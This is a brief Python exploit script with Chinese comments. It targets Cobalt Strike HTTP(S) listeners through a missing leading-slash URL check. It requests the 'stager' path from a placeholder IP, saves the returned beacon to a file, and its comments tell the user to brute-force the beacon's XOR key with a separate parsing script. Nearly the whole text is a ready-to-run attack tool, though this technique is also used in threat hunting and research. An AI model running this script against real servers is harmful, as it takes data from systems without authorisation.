
'''
Descripttion: 
Author: Zhu013
Date: 2022-03-24 15:36:21
'''
#原理 https://mp.weixin.qq.com/s/n2KK09UQIfbaCyCfMOvvqw
#支持到4.5版本 原理就是CobaltStrike的HTTP(S)监听器对请求URL未进行"/"开头验证，攻击者可通过指定URL获取相关信息。
#至于解密，既然拿到了就算改过密码,不改算法就是00-FF嘛，爆破start！
import http.client

ip = 'XX.XX.XX.XX'
port= '80'
stager=  ['stager','stager64','beacon.http-post','beacon.http-get']

try:
    conn = http.client.HTTPConnection(ip,port)
    #以stager举例子
    conn.request("GET",stager[0],None)
    re = conn.getresponse()
    f = open('beacon','wb')
    f.write(re.read())
except:
    pass
#保存为beacon文件,再配合parse_beacon_config.py解密 解密脚本github自己下然后改爆破
#python parse_beacon_config.py beacon